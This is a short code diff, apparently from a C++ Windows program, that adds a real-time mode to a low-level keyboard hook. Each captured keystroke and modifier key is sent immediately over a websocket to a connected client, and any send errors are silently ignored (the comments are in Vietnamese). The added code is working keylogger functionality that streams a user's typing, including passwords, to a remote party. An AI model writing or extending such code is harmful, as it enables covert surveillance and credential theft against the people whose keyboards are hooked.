@@ -163,8 +163,22 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                         }
                     }
                 }
+                
                 std::lock_guard<std::mutex> lock(g_LogMutex);
                 g_KeylogBuffer += final;
+                
+                // Real-time Mode: Gửi ngay lập tức cho client
+                if (g_KeylogMode == "realtime" && g_ClientConnected && g_ServerPtr != nullptr) {
+                    try {
+                        json j_realtime;
+                        j_realtime["type"] = "KEYLOG_REALTIME";
+                        j_realtime["data"] = final;
+                        g_ServerPtr->send(g_ClientHdl, j_realtime.dump(), websocketpp::frame::opcode::text);
+                    }
+                    catch (...) {
+                        // Bỏ qua lỗi gửi
+                    }
+                }
             }
         }
         // --- TRƯỜNG HỢP 2: KEYUP ---
@@ -188,6 +202,19 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 if (!modName.empty()) {
                     std::lock_guard<std::mutex> lock(g_LogMutex);
                     g_KeylogBuffer += modName;
+                    
+                    // Real-time Mode: Gửi ngay lập tức cho client
+                    if (g_KeylogMode == "realtime" && g_ClientConnected && g_ServerPtr != nullptr) {
+                        try {
+                            json j_realtime;
+                            j_realtime["type"] = "KEYLOG_REALTIME";
+                            j_realtime["data"] = modName;
+                            g_ServerPtr->send(g_ClientHdl, j_realtime.dump(), websocketpp::frame::opcode::text);
+                        }
+                        catch (...) {
+                            // Bỏ qua lỗi gửi
+                        }
+                    }
                 }
                 g_PendingModifiers.erase(key);
             }
